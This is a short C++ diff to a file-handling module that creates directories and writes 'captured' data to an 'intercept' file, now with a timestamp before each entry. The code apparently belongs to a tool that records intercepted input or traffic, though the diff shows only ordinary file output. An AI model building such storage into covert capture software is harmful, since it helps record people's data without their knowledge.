@@ -32,7 +32,7 @@ namespace file_handler
             if (c == '\\')
             {
                 c = '\0';
-                check = (bool)(CreateDirectory(file_path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS);
+                check = (bool)(CreateDirectoryA(file_path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS);
                 if (!check)
                     return false;
                 c = '\\';
@@ -82,8 +82,9 @@ namespace file_handler
             write_logs("Can't create/open intercept file --> " + get_full_path());
             return false;
         }
-
-        file << captured << "\n";
+        file << "<<" << date_time::get_date_time() << ">>\n"
+             << captured << "\n";
+             
         file.close();
         write_logs("Successfully wrote intercept");
         return true;
